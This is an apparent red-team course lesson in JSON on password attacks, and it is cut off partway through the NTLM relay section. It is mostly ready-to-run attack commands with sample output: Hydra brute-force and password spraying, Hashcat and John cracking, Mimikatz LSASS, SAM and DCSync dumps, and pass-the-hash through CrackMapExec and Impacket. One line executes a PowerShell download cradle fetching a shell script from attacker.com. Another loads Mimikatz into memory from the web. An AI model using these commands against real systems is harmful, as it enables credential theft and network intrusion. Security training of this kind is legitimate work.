{
  "lesson_id": "5915f692-0956-4f5c-a187-f461e6972217",
  "domain": "red_team",
  "title": "Password Attacks & Credential Harvesting",
  "subtitle": "Attacking authentication, cracking hashes, and harvesting credentials",
  "difficulty": 2,
  "estimated_time": 50,
  "order_index": 7,
  "prerequisites": [],
  "concepts": [
    "Password Cracking",
    "Hash Cracking",
    "Credential Harvesting",
    "Pass-the-Hash",
    "Mimikatz",
    "Hydra",
    "Hashcat",
    "John the Ripper"
  ],
  "learning_objectives": [
    "Understand different password attack techniques and when to use each",
    "Master hash cracking with Hashcat and John the Ripper",
    "Learn credential harvesting techniques on Windows and Linux",
    "Perform Pass-the-Hash and Pass-the-Ticket attacks"
  ],
  "content_blocks": [
    {
      "block_id": "f1e2d3c4-b5a6-4978-8e9f-0a1b2c3d4e5f",
      "type": "mindset_coach",
      "title": "The Art of Password Attacks",
      "content": {
        "text": "**Welcome to password attacks - the gateway to privilege escalation!**\n\nYou're about to learn one of the most critical skills in offensive security. Passwords are still the #1 authentication method, which makes them the #1 target for attackers.\n\n**Here's the truth**: In 2023, 81% of data breaches involved stolen or weak passwords (Verizon DBIR). Despite decades of security awareness, users still choose \"Password123!\" and reuse credentials across services.\n\n**The Jim Kwik principle at work**: We'll use ACTIVE LEARNING - you won't just read about password cracking, you'll see real attack outputs and learn to recognize weak passwords instantly. We'll GAMIFY IT - watching a hash crack is oddly satisfying.\n\n**Why this matters**: The 2020 SolarWinds breach began with a compromised password. The 2021 Colonial Pipeline ransomware attack started with a leaked VPN password. Your ability to attack, crack, and defend against password attacks directly impacts an organization's security posture.\n\n**Your goal for this lesson**: Master password attacks so thoroughly that you can assess password security, crack hashes efficiently, and understand how attackers harvest credentials - then use that knowledge to defend better."
      }
    },
    {
      "block_id": "a2b3c4d5-e6f7-4a89-9b0c-1d2e3f4a5b6c",
      "type": "explanation",
      "title": "Password Attack Types: The Complete Arsenal",
      "content": {
        "text": "## Understanding Password Attacks\n\nPassword attacks fall into several categories, each with specific use cases:\n\n### 1. Online Password Attacks\n**Definition**: Attacking authentication services directly (SSH, RDP, web login forms)\n\n**Characteristics**:\n- ✅ Tests real credentials against live service\n- ✅ Immediate access if successful\n- ❌ Slow (network latency, rate limiting)\n- ❌ Easily detected (logs, IDS, account lockouts)\n- ❌ Risk of account lockout\n\n**Tools**: Hydra, Medusa, CrackMapExec, Metasploit\n\n**When to use**: \n- When you don't have password hashes\n- Testing specific accounts\n- Services without rate limiting\n- After discovering usernames\n\n### 2. Offline Password Attacks (Hash Cracking)\n**Definition**: Cracking password hashes obtained from database dumps, memory, or file systems\n\n**Characteristics**:\n- ✅ Very fast (millions of attempts per second)\n- ✅ No detection risk (offline)\n- ✅ No account lockout\n- ❌ Requires hash acquisition first\n- ❌ Strong hashes take time (bcrypt, scrypt)\n\n**Tools**: Hashcat, John the Ripper\n\n**When to use**:\n- After dumping SAM/NTDS.dit\n- Found hashes in database\n- Extracted from memory\n- Password-protected files\n\n### 3. Pass-the-Hash Attacks\n**Definition**: Using password hashes directly for authentication (without cracking)\n\n**Characteristics**:\n- ✅ No cracking needed\n- ✅ Works even with strong passwords\n- ✅ Fast lateral movement\n- ❌ Only works with NTLM (Windows)\n- ❌ Requires local admin first\n\n**Tools**: Mimikatz, CrackMapExec, Impacket\n\n**When to use**:\n- Windows environments\n- NTLM hashes obtained\n- Need immediate lateral movement\n- Password too strong to crack\n\n### 4. Credential Harvesting\n**Definition**: Extracting plaintext credentials from memory, files, or configuration\n\n**Characteristics**:\n- ✅ Gets plaintext passwords\n- ✅ No cracking needed\n- ✅ Often finds service account passwords\n- ❌ Requires system access\n- ❌ May require elevated privileges\n\n**Tools**: Mimikatz, LaZagne, Responder\n\n**When to use**:\n- After initial foothold\n- Privilege escalation\n- Finding cached credentials\n- Lateral movement prep\n\n## Attack Flow Decision Tree\n\n```\nDo you have system access?\n├─ NO → Online password attacks (Hydra, brute force)\n└─ YES → \n├─ Can you get hashes?\n│   ├─ YES → \n│   │   ├─ Windows NTLM? → Pass-the-Hash (skip cracking!)\n│   │   └─ Other hashes? → Offline cracking (Hashcat)\n│   └─ NO → Credential harvesting (Mimikatz, LaZagne)\n└─ Need to escalate? → Dump hashes, then crack or PTH\n```bash\n\n## Password Attack Methodology\n\n**Phase 1: Reconnaissance**\n- Identify authentication methods\n- Enumerate valid usernames\n- Check password policy (complexity, lockout)\n- Identify hash types in use\n\n**Phase 2: Initial Access**\n- Try default credentials\n- Check common passwords\n- Targeted password spray (avoid lockout)\n- Look for credential leaks (breaches, GitHub)\n\n**Phase 3: Credential Access**\n- Dump password hashes (SAM, NTDS.dit)\n- Extract from memory (Mimikatz)\n- Search files and scripts\n- Capture network authentication (Responder)\n\n**Phase 4: Credential Cracking**\n- Identify hash type\n- Choose wordlist or attack mode\n- Crack offline with Hashcat\n- Use rules for mutations\n\n**Phase 5: Lateral Movement**\n- Test cracked credentials\n- Pass-the-Hash if can't crack\n- Spray credentials across network\n- Escalate to Domain Admin\n\n**Memory aid**: \"**R**econ **I**nitial **C**redential **C**racking **L**ateral\" = **RICCL** (like \"rickle\")"
      }
    },
    {
      "block_id": "b3c4d5e6-f7a8-4b90-9c0d-1e2f3a4b5c6d",
      "type": "explanation",
      "title": "Online Password Attacks with Hydra",
      "content": {
        "text": "## What is Hydra?\n\n**Hydra** (THC-Hydra) is a fast network authentication cracker supporting 50+ protocols.\n\n**Supported protocols**: SSH, RDP, FTP, HTTP(S), SMB, MSSQL, MySQL, PostgreSQL, VNC, SMTP, POP3, IMAP, and more.\n\n## Basic Hydra Syntax\n\n```bash\nhydra -l USERNAME -p PASSWORD [protocol://]TARGET [options]\n```\n\n**Key flags**:\n- `-l` : Single username\n- `-L` : Username wordlist file\n- `-p` : Single password\n- `-P` : Password wordlist file\n- `-t` : Number of parallel threads (default 16)\n- `-s` : Port number (if non-default)\n- `-f` : Stop after first successful login\n- `-V` : Verbose (show attempts)\n- `-o` : Output file\n\n## SSH Brute Force\n\n```bash\n# Single user, password wordlist\nhydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100\n\n# Multiple users, password wordlist\nhydra -L users.txt -P passwords.txt ssh://192.168.1.100\n\n# Single user, single password (test)\nhydra -l admin -p password123 ssh://192.168.1.100\n\n# SSH on non-standard port\nhydra -l root -P rockyou.txt ssh://192.168.1.100 -s 2222\n\n# Faster with more threads\nhydra -l root -P rockyou.txt ssh://192.168.1.100 -t 4\n\n# Stop after first success\nhydra -l root -P rockyou.txt ssh://192.168.1.100 -f\n\n# Save results to file\nhydra -l root -P rockyou.txt ssh://192.168.1.100 -o ssh-results.txt\n```\n\n**Output when successful**:\n```\n[22][ssh] host: 192.168.1.100   login: root   password: password123\n[STATUS] attack finished for 192.168.1.100 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\n```bash\n\n## RDP Brute Force\n\n```bash\n# RDP attack (port 3389)\nhydra -l administrator -P passwords.txt rdp://192.168.1.100\n\n# Multiple users\nhydra -L users.txt -P passwords.txt rdp://192.168.1.100\n\n# With verbose output\nhydra -l administrator -P passwords.txt rdp://192.168.1.100 -V\n```\n\n**Note**: RDP is often slow and may have account lockout policies.\n\n## HTTP POST Form Attack\n\nWeb login forms are common targets.\n\n**Step 1: Capture the login request**\nUse Burp Suite or browser dev tools to see:\n- POST URL\n- Parameter names (username, password)\n- Failure message\n\n**Example login form**:\n```\nPOST /login.php HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=test123\n```\n\n**Response for failed login**:\n```\nHTTP/1.1 200 OK\n<html>...<div>Invalid username or password</div>...</html>\n```\n\n**Step 2: Craft Hydra command**\n```bash\nhydra -l admin -P passwords.txt example.com http-post-form \"/login.php:username=^USER^&password=^PASS^:Invalid username\"\n```\n\n**Syntax breakdown**:\n- `/login.php` : POST URL path\n- `username=^USER^&password=^PASS^` : POST parameters (^USER^ and ^PASS^ are placeholders)\n- `Invalid username` : String that appears in failed login response\n\n**More examples**:\n```bash\n# Basic web form\nhydra -l admin -P rockyou.txt example.com http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"\n\n# With specific failure string\nhydra -L users.txt -P passwords.txt example.com http-post-form \"/admin/login.php:username=^USER^&password=^PASS^:F=Login failed\"\n\n# HTTPS (SSL)\nhydra -l admin -P passwords.txt example.com https-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid\"\n\n# With cookies\nhydra -l admin -P passwords.txt example.com http-post-form \"/login:username=^USER^&password=^PASS^:F=Wrong:H=Cookie: PHPSESSID=abc123\"\n```\n\n**`F=` vs `S=`**:\n- `F=` : Failure string (string that appears when login FAILS)\n- `S=` : Success string (string that appears when login SUCCEEDS)\n\n## SMB/Windows Login Attack\n\n```bash\n# SMB brute force\nhydra -l administrator -P passwords.txt smb://192.168.1.100\n\n# Multiple users\nhydra -L users.txt -P passwords.txt smb://192.168.1.100\n```bash\n\n## FTP Brute Force\n\n```bash\n# FTP attack\nhydra -l admin -P passwords.txt ftp://192.168.1.100\n\n# Anonymous FTP test\nhydra -l anonymous -p \"\" ftp://192.168.1.100\n```bash\n\n## MySQL Database Attack\n\n```bash\n# MySQL brute force\nhydra -l root -P passwords.txt mysql://192.168.1.100\n\n# With specific port\nhydra -l root -P passwords.txt mysql://192.168.1.100 -s 3307\n```bash\n\n## Password Spraying (Avoid Lockout)\n\n**Problem**: Traditional brute force tries many passwords per user → Account lockout\n\n**Solution**: Password spraying tries ONE password against MANY users → No lockout\n\n**Scenario**: You found 100 usernames. Password policy allows 3 failed attempts before 30-minute lockout.\n\n**Wrong approach** (brute force):\n```bash\n# BAD: Tries rockyou.txt against one user → Lockout after 3 attempts\nhydra -l admin -P rockyou.txt ssh://target.com\n```\n\n**Right approach** (password spray):\n```bash\n# GOOD: Try ONE common password against ALL users\nhydra -L users.txt -p Password123! ssh://target.com\nhydra -L users.txt -p Welcome2024! ssh://target.com\nhydra -L users.txt -p Summer2024! ssh://target.com\n```\n\n**Creating a spray list**:\n```bash\n# Common passwords for spraying\nPassword123!\nWelcome2024!\nCompany2024!\nSummer2024!\nAdmin@123\nP@ssw0rd\n[CompanyName]2024!\n```\n\n**Tools for password spraying**:\n```bash\n# CrackMapExec (better for Windows)\ncrackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!'\n\n# Spray-Passwords.ps1 (PowerShell)\nInvoke-DomainPasswordSpray -UserList users.txt -Password Password123! -Domain example.com\n```bash\n\n## Hydra Performance Tuning\n\n```bash\n# Slow and stealthy (1 thread, delays)\nhydra -l admin -P passwords.txt ssh://target.com -t 1 -w 3\n\n# Fast (64 threads)\nhydra -l admin -P passwords.txt ssh://target.com -t 64\n\n# Resume aborted session\nhydra -R  # Reads from hydra.restore\n```bash\n\n## Common Wordlists\n\n```bash\n# rockyou.txt (14 million passwords from 2009 breach)\n/usr/share/wordlists/rockyou.txt\n\n# SecLists (comprehensive)\n/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt\n/usr/share/seclists/Passwords/Common-Credentials/best1050.txt\n/usr/share/seclists/Passwords/darkweb2017-top10000.txt\n\n# Usernames\n/usr/share/seclists/Usernames/top-usernames-shortlist.txt\n/usr/share/seclists/Usernames/Names/names.txt\n```bash\n\n## Real-World Attack Example\n\n**Target**: Company web portal at https://portal.example.com/login\n\n**Step 1**: Enumerate users (found sales@example.com, admin@example.com)\n\n**Step 2**: Check password policy (3 failed attempts = lockout)\n\n**Step 3**: Password spray (avoid lockout)\n```bash\n# Try one common password against all users\nhydra -L users.txt -p 'Welcome2024!' example.com https-post-form \"/login:email=^USER^&password=^PASS^:F=Invalid credentials\"\n```\n\n**Step 4**: Success! Found admin@example.com:Welcome2024!\n\n**Step 5**: Log in and enumerate further\n\n**Mitigation**:\n- Rate limiting (slow down attacks)\n- Account lockout policies\n- Multi-factor authentication\n- CAPTCHA after failed attempts\n- Monitor for password spray patterns"
      }
    },
    {
      "block_id": "c4d5e6f7-a8b9-4c01-9d0e-1f2a3b4c5d6e",
      "type": "explanation",
      "title": "Hash Cracking with Hashcat and John the Ripper",
      "content": {
        "text": "## Understanding Password Hashing\n\n**Hash**: One-way mathematical function that converts password to fixed-length string.\n\n**Key properties**:\n- One-way (can't reverse: hash → password)\n- Deterministic (same input = same hash)\n- Avalanche effect (small change = completely different hash)\n\n**Example**:\n```\nPassword: \"password123\"\nMD5:      482c811da5d5b4bc6d497ffa98491e38\nSHA-1:    cbfdac6008f9cab4083784cbd1874f76618d2a97\nSHA-256:  ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f\nNTLM:     7b1d0f6f2a1c5e84db8f8e7f2b5a1d3c\n```\n\n**Salt**: Random data added to password before hashing\n```\nPassword: \"password123\"\nSalt:     \"a8f3j2k9\"\nHash:     hash(\"password123\" + \"a8f3j2k9\")\n```\n\n**Why salting matters**: Prevents rainbow table attacks (precomputed hashes).\n\n## Common Hash Types\n\n| Hash Type | Length | Example | Usage |\n|-----------|---------|---------|-------|\n| **MD5** | 32 hex | 5f4dcc3b5aa765d61d8327deb882cf99 | Old systems, files |\n| **SHA-1** | 40 hex | 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 | Legacy systems |\n| **SHA-256** | 64 hex | 5e884898da28047151d0e56f8dc6292773603d0d... | Linux/modern systems |\n| **NTLM** | 32 hex | 8846f7eaee8fb117ad06bdd830b7586c | Windows (no salt!) |\n| **bcrypt** | 60 char | $2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68L... | Modern web apps |\n\n**Identifying hash types**:\n```bash\n# With hash-identifier\nhash-identifier\n# Paste hash, get type\n\n# With hashid\nhashid '5f4dcc3b5aa765d61d8327deb882cf99'\n# Output: MD5\n\n# With hashcat example hashes\nhashcat --example-hashes | grep -i ntlm\n```bash\n\n## Hashcat - GPU Password Cracker\n\n**Why Hashcat?**\n- ✅ GPU acceleration (1000x faster than CPU)\n- ✅ Supports 300+ hash types\n- ✅ Multiple attack modes\n- ✅ Rule-based attacks\n- ✅ Distributed cracking\n\n### Basic Hashcat Syntax\n\n```bash\nhashcat -m [hash_type] -a [attack_mode] [hash_file] [wordlist]\n```\n\n**Hash type modes** (full list: `hashcat --help`):\n- `0` : MD5\n- `100` : SHA-1\n- `1000` : NTLM\n- `1400` : SHA-256\n- `1800` : sha512crypt (Linux)\n- `3200` : bcrypt\n- `5600` : NetNTLMv2\n\n**Attack modes**:\n- `0` : Straight (wordlist)\n- `1` : Combination (two wordlists)\n- `3` : Brute-force (mask attack)\n- `6` : Hybrid wordlist + mask\n- `7` : Hybrid mask + wordlist\n\n### Wordlist Attack (Mode 0)\n\n```bash\n# Basic MD5 crack\nhashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n\n# NTLM crack\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt\n\n# SHA-256 crack\nhashcat -m 1400 -a 0 sha256.txt /usr/share/wordlists/rockyou.txt\n\n# Show cracked passwords\nhashcat -m 0 --show hash.txt\n\n# Output to file\nhashcat -m 0 -a 0 hash.txt rockyou.txt -o cracked.txt\n```\n\n**Hash file format** (one hash per line):\n```\n5f4dcc3b5aa765d61d8327deb882cf99\n482c811da5d5b4bc6d497ffa98491e38\n```\n\n**With username** (format: `user:hash`):\n```\nadmin:5f4dcc3b5aa765d61d8327deb882cf99\nroot:482c811da5d5b4bc6d497ffa98491e38\n```bash\n\n### Rule-Based Attack\n\n**Rules** mutate wordlist entries to try variations.\n\n**Common mutations**:\n- Append numbers: password → password1, password123\n- Capitalize: password → Password, PASSWORD\n- Leetspeak: password → p@ssw0rd\n- Add special chars: password → password!\n\n```bash\n# Use best64 rule (64 most effective rules)\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# Use OneRuleToRuleThemAll (comprehensive)\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule\n\n# Combine multiple rules\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/best64.rule -r rules/toggles1.rule\n```\n\n**Custom rule example** (myrules.rule):\n```bash\n# Rule syntax:\n$1          # Append '1'\n$2$3        # Append '23'\nc           # Capitalize first letter\nu           # Uppercase all\nl           # Lowercase all\ntoggle3     # Toggle case of character 3\n```bash\n\n### Mask Attack (Brute Force)\n\n**Masks** define character sets for brute force.\n\n**Mask syntax**:\n- `?l` : Lowercase letters (a-z)\n- `?u` : Uppercase letters (A-Z)\n- `?d` : Digits (0-9)\n- `?s` : Special characters (!@#$%^&*)\n- `?a` : All characters (?l?u?d?s)\n\n**Examples**:\n```bash\n# 8-character lowercase\nhashcat -m 1000 -a 3 ntlm.txt ?l?l?l?l?l?l?l?l\n\n# Password + 2 digits (password12)\nhashcat -m 1000 -a 3 ntlm.txt password?d?d\n\n# Uppercase + 6 lowercase + 2 digits (Password12)\nhashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?l?l?d?d\n\n# 4-digit PIN\nhashcat -m 1000 -a 3 ntlm.txt ?d?d?d?d\n\n# All 6-character combinations (very slow!)\nhashcat -m 1000 -a 3 ntlm.txt ?a?a?a?a?a?a\n```\n\n**Incremental brute force**:\n```bash\n# Try lengths 1-8 characters\nhashcat -m 1000 -a 3 ntlm.txt --increment --increment-min=1 --increment-max=8 ?a?a?a?a?a?a?a?a\n```bash\n\n### Combination Attack\n\n```bash\n# Combine two wordlists (word1 + word2)\nhashcat -m 1000 -a 1 ntlm.txt wordlist1.txt wordlist2.txt\n\n# Example: first_names.txt + last_names.txt\n# Creates: johnsmith, maryj jones, etc.\n```bash\n\n### Hybrid Attacks\n\n```bash\n# Wordlist + mask (password + 123)\nhashcat -m 1000 -a 6 ntlm.txt rockyou.txt ?d?d?d\n\n# Mask + wordlist (ABC + password)\nhashcat -m 1000 -a 7 ntlm.txt ?u?u?u rockyou.txt\n```bash\n\n### Performance Optimization\n\n```bash\n# Show available devices\nhashcat -I\n\n# Use specific GPU\nhashcat -m 1000 -a 0 -d 1 ntlm.txt rockyou.txt\n\n# Workload tuning (1=low, 4=insane)\nhashcat -m 1000 -a 0 -w 3 ntlm.txt rockyou.txt\n\n# Session management (resume)\nhashcat -m 1000 -a 0 --session=mysession ntlm.txt rockyou.txt\nhashcat --session=mysession --restore\n```bash\n\n## John the Ripper - CPU Password Cracker\n\n```bash\n# Basic crack\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n# Show cracked passwords\njohn --show hash.txt\n\n# Crack with rules\njohn --wordlist=rockyou.txt --rules hash.txt\n\n# Incremental mode (brute force)\njohn --incremental hash.txt\n\n# Specific format\njohn --format=NT hash.txt  # NTLM\njohn --format=raw-md5 hash.txt  # MD5\n\n# List supported formats\njohn --list=formats\n```\n\n**John vs Hashcat**:\n- **John**: Better for CPU, auto-detects formats, simpler\n- **Hashcat**: Much faster with GPU, more attack modes, manual format selection\n\n## Real-World Cracking Strategy\n\n**Step 1: Triage (fast attempts)**\n```bash\n# Try top 1000 passwords (2 minutes)\nhashcat -m 1000 ntlm.txt /usr/share/seclists/Passwords/darkweb2017-top10000.txt\n```\n\n**Step 2: Full wordlist with rules**\n```bash\n# rockyou + best64 rules (30 minutes)\nhashcat -m 1000 ntlm.txt rockyou.txt -r best64.rule\n```\n\n**Step 3: Mask attack on common patterns**\n```bash\n# Capitalize + lowercase + 2 digits (Password12)\nhashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?l?l?d?d\n```\n\n**Step 4: Extended wordlists**\n```bash\n# Larger wordlists\nhashcat -m 1000 ntlm.txt wordlists/10-million-password-list.txt\n```\n\n**Step 5: Give up or rent cloud GPU**\n```bash\n# For bcrypt, strong SHA-512, etc., consider:\n# - AWS GPU instances\n# - Cloud cracking services\n# - Distributed cracking\n```"
      }
    },
    {
      "block_id": "d5e6f7a8-b9c0-4d12-9e0f-1a2b3c4d5e6f",
      "type": "explanation",
      "title": "Windows Credential Harvesting with Mimikatz",
      "content": {
        "text": "## What is Mimikatz?\n\n**Mimikatz** is a post-exploitation tool that extracts plaintext passwords, hashes, and Kerberos tickets from Windows memory.\n\n**Created by**: Benjamin Delpy (@gentilkiwi)\n**Capabilities**:\n- Extract plaintext passwords from LSASS\n- Dump NTLM hashes\n- Pass-the-Hash\n- Pass-the-Ticket\n- Golden Ticket / Silver Ticket attacks\n- Kerberos ticket manipulation\n\n**Requirements**: Local Administrator or SYSTEM privileges\n\n## Running Mimikatz\n\n```powershell\n# Download and run\nInvoke-WebRequest -Uri \"https://github.com/gentilkiwi/mimikatz/releases/download/latest/mimikatz_trunk.zip\" -OutFile mimikatz.zip\nExpand-Archive mimikatz.zip\ncd mimikatz\\x64\n.\\mimikatz.exe\n\n# Or run directly in memory (avoid disk)\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')\nInvoke-Mimikatz\n```\n\n**Mimikatz prompt**:\n```\nmimikatz # \n```bash\n\n## Mimikatz Commands\n\n### Elevate Privileges\n```\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # token::elevate\nToken Id  : 0\nUser name : NT AUTHORITY\\SYSTEM\n```\n\n**Explanation**: \n- `privilege::debug` enables SeDebugPrivilege (required to access LSASS)\n- `token::elevate` impersonates SYSTEM token\n\n### Dump Plaintext Passwords (sekurlsa)\n\n```\nmimikatz # sekurlsa::logonpasswords\n```\n\n**Output example**:\n```\nAuthentication Id : 0 ; 12345678\nSession           : Interactive from 1\nUser Name         : Administrator\nDomain            : CONTOSO\nLogon Server      : DC01\nLogon Time        : 1/15/2024 10:30:15 AM\nSID               : S-1-5-21-123456789-...\nmsv :\n[00000003] Primary\n* Username : Administrator\n* Domain   : CONTOSO\n* NTLM     : 8846f7eaee8fb117ad06bdd830b7586c\n* SHA1     : 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8\ntspkg :\nwdigest :\n* Username : Administrator\n* Domain   : CONTOSO\n* Password : P@ssw0rd123      ← PLAINTEXT PASSWORD!\nkerberos :\n* Username : Administrator\n* Domain   : CONTOSO.COM\n* Password : P@ssw0rd123\n```\n\n**What you get**:\n- ✅ Plaintext passwords (if WDigest enabled)\n- ✅ NTLM hashes (always present)\n- ✅ Kerberos tickets\n- ✅ Username and domain\n\n### Dump All Credentials\n\n```\nmimikatz # sekurlsa::logonpasswords full\n\n# Export to file\nmimikatz # log credentials.txt\nmimikatz # sekurlsa::logonpasswords\n```bash\n\n### Extract Kerberos Tickets\n\n```\nmimikatz # sekurlsa::tickets\n\n# Export tickets\nmimikatz # sekurlsa::tickets /export\n\n# List ticket files\ndir *.kirbi\n```bash\n\n### Dump SAM Database\n\nThe **SAM (Security Account Manager)** stores local user password hashes.\n\n```\nmimikatz # lsadump::sam\n\n# Output:\nRID  : 000001f4 (500)\nUser : Administrator\nHash NTLM: 8846f7eaee8fb117ad06bdd830b7586c\n```bash\n\n### Dump Domain Credentials (DCSync)\n\n**DCSync** replicates password hashes from Domain Controller (requires Domain Admin or Replication rights).\n\n```\nmimikatz # lsadump::dcsync /user:Administrator\nmimikatz # lsadump::dcsync /user:krbtgt        ← For Golden Ticket\nmimikatz # lsadump::dcsync /domain:contoso.com /all\n```\n\n**Output**:\n```\nObject RDN           : Administrator\nHash NTLM: 8846f7eaee8fb117ad06bdd830b7586c\n```bash\n\n### Pass-the-Hash with Mimikatz\n\n```\nmimikatz # sekurlsa::pth /user:Administrator /domain:CONTOSO /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe\n```\n\n**What happens**:\n- Opens new cmd.exe window\n- Authenticates as Administrator using NTLM hash\n- No password needed!\n\n**Now you can**:\n```cmd\nnet use \\\\dc01\\c$ /user:CONTOSO\\Administrator\ndir \\\\dc01\\c$\npsexec.exe \\\\dc01 cmd.exe\n```bash\n\n## Credential Dumping Methods Comparison\n\n| Method | Tool | Privilege Required | Gets Plaintext? | Gets Hashes? |\n|--------|------|-------------------|----------------|-------------|\n| LSASS dump | Mimikatz | Admin/SYSTEM | Sometimes | Yes (NTLM) |\n| SAM dump | Mimikatz | SYSTEM | No | Yes (NTLM) |\n| DCSync | Mimikatz | Domain Admin | No | Yes (NTLM) |\n| Registry | reg.exe | Admin | No | Yes (encrypted) |\n| NTDS.dit | ntdsutil | DA on DC | No | Yes (all domain) |\n\n## Alternative Tools\n\n### Impacket secretsdump.py\n\n```bash\n# Remote dump SAM (from Kali)\nsecretsdump.py CONTOSO/Administrator:Password123@192.168.1.100\n\n# Dump with NTLM hash (Pass-the-Hash)\nsecretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CONTOSO/Administrator@192.168.1.100\n\n# DCSync from Linux\nsecretsdump.py CONTOSO/Administrator:Password123@dc01.contoso.com -just-dc-user krbtgt\n```bash\n\n### LaZagne - Multi-Platform Password Recovery\n\n```bash\n# Dump all saved passwords (browsers, email, WiFi, etc.)\nlaZagne.exe all\n\n# Specific module\nlaZagne.exe browsers\nlaZagne.exe wifi\n```bash\n\n### CrackMapExec\n\n```bash\n# Dump SAM\ncrackmapexec smb 192.168.1.100 -u Administrator -p Password123 --sam\n\n# Dump LSA secrets\ncrackmapexec smb 192.168.1.100 -u Administrator -p Password123 --lsa\n\n# DCSync\ncrackmapexec smb 192.168.1.100 -u Administrator -p Password123 --ntds\n```bash\n\n## Defending Against Mimikatz\n\n**Prevention**:\n- ✅ Credential Guard (Windows 10+)\n- ✅ Disable WDigest (prevents plaintext in memory)\n- ✅ Protected Process Light (PPL) for LSASS\n- ✅ LSA Protection\n- ✅ Limit local admin accounts\n\n**Detection**:\n- ✅ Monitor for LSASS access (Sysmon Event ID 10)\n- ✅ Detect privilege::debug calls\n- ✅ Alert on suspicious process behavior\n- ✅ EDR/AV detection signatures\n\n**PowerShell to disable WDigest**:\n```powershell\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" -Name UseLogonCredential -Value 0\n```"
      }
    },
    {
      "block_id": "e6f7a8b9-c0d1-4e23-9f0a-1b2c3d4e5f6a",
      "type": "real_world",
      "title": "Pass-the-Hash and NTLM Relay Attacks",
      "content": {
        "text": "## What is Pass-the-Hash (PTH)?\n\n**Pass-the-Hash** is an attack where you authenticate using a password hash instead of the plaintext password.\n\n**Why it works**: Windows NTLM authentication only requires the hash, not the actual password.\n\n**Scenario**:\n1. You compromised workstation as local admin\n2. Dumped NTLM hashes with Mimikatz\n3. Found hash for domain admin: `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`\n4. Password is 20 characters random (impossible to crack)\n5. **Solution**: Pass the hash directly!\n\n## NTLM Hash Format\n\n```\nLM:NTLM\naad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n```\n\n- **LM hash**: Legacy (weak), usually empty → `aad3b435b51404eeaad3b435b51404ee`\n- **NTLM hash**: Modern, this is what we use\n\n**Fun fact**: `aad3b435b51404eeaad3b435b51404ee` is the LM hash of an empty string.\n\n## Pass-the-Hash with Mimikatz\n\n```\nmimikatz # sekurlsa::pth /user:Administrator /domain:CONTOSO /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe\n```\n\n**Opens new PowerShell window authenticated as Administrator**:\n```powershell\n# Now you can access remote systems\nnet use \\\\dc01\\c$\ndir \\\\dc01\\c$\\Users\n\n# Execute commands remotely\nInvoke-Command -ComputerName dc01 -ScriptBlock {whoami}\n\n# PsExec to get shell\npsexec.exe \\\\dc01 cmd.exe\n```bash\n\n## Pass-the-Hash with CrackMapExec\n\n```bash\n# Single target\ncrackmapexec smb 192.168.1.100 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c\n\n# Entire subnet\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c\n\n# Execute command\ncrackmapexec smb 192.168.1.100 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x \"whoami\"\n\n# Get shell with PsExec\ncrackmapexec smb 192.168.1.100 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\"\n```bash\n\n## Pass-the-Hash with Impacket\n\n```bash\n# PsExec (get SYSTEM shell)\nimpacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c CONTOSO/Administrator@192.168.1.100\n\n# WMIExec (stealthier)\nimpacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c CONTOSO/Administrator@192.168.1.100\n\n# SMBExec\nimpacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c CONTOSO/Administrator@192.168.1.100\n\n# AtExec (via scheduled task)\nimpacket-atexec -hashes :8846f7eaee8fb117ad06bdd830b7586c CONTOSO/Administrator@192.168.1.100 whoami\n```bash\n\n## NTLM Relay Attacks\n\n**NTLM Relay**: Intercept NTLM authentication and relay it to another target.\n\n**Attack flow**:\n```\nVictim                    Attacker                    Target\n|                          |                           |\n|--NTLM Auth Request----→ |                           |\n|                          |---Relay NTLM Auth------→ |\n|                          | ←------Challenge---------|  \n| ←------Challenge---------|                           |\n|--Response------------→ |                           |\n|                          |---Relay Response-------→ |\n|                          | ←------Access Granted----|  \n```\n\n**Attacker gets**: Authenticated access to Target using Victim's credentials!\n\n### NTLM Relay with Responder + ntlmrelayx\n\n**Step 1**: Set up Responder (capture NTLM)\n```bash\n# Edit Responder.conf\nvim /etc/responder/Responder.conf\n# Set SMB = Off, HTTP = Off (let ntlmrelayx 